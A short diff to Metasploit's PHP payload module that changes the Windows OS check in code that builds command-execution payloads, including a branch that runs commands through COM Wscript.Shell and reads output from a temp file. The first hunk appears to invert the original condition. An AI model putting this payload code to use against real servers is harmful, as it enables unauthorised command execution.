@@ -48,7 +48,7 @@ module Msf::Payload::Php
 		in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 		
 		setup = "
-			if (!(strtolower(PHP_OS) =~ 'win')) {
+			if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
 				#{cmd}=#{cmd}.\" 2>&1\\n\";
 			}
 			#{is_callable}='is_callable';
@@ -102,7 +102,7 @@ module Msf::Payload::Php
 		# objects (which are not subject to safe mode restrictions) instead of
 		# PHP functions.
 		win32_com = "
-			if (strtolower(PHP_OS) =~ 'win') {
+			if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
 				$wscript = new COM('Wscript.Shell');
 				$wscript->run(#{cmd} . ' > %TEMP%\\out.txt');
 				#{output} = file_get_contents('%TEMP%\\out.txt');
